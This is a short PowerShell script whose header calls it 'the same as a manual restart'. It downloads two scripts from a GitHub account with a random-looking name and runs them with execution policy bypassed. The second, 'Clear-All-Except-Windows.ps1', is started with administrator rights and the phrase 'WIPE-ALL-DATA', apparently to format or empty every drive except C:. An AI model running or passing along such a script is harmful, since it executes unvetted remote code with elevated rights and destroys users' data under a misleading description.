<#
  Same as a manual restart, then clear Downloads and format/empty every drive that is not C:.
#>
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
$dir = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$setup = Join-Path $dir 'Admin-Setup.ps1'
$wipe = Join-Path $dir 'Clear-All-Except-Windows.ps1'
Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1' -OutFile $setup
Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Clear-All-Except-Windows.ps1' -OutFile $wipe
Unblock-File $setup, $wipe
$ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
& $ps -STA -NoProfile -ExecutionPolicy Bypass -File $setup
Start-Process -FilePath $ps -Verb RunAs -Wait -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$wipe`"",'-ConfirmPhrase','WIPE-ALL-DATA')
